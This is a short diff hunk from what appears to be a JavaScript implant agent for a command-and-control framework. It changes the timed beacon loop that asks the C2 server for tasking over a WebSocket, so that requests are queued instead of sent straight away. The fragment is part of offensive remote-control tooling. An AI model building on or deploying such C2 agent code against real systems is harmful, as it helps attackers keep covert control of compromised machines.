@@ -68,14 +68,9 @@ const connection  = new WebSocket(`${C2.server}`);
 
 setInterval(function(){
     let request = {'action':'get_tasking', 'tasking_size': 1, 'delegates':[]};
-    let msg = {
-        'client':true,
-        'data': JSON.stringify(request),
-        'tag':''
-    };
-    let final = JSON.stringify(msg);
-    connection.send(final);
-    
+    let msg = JSON.stringify(request);
+    out.push(msg);
+
     C2.postResponse();
 }, C2.interval);
 
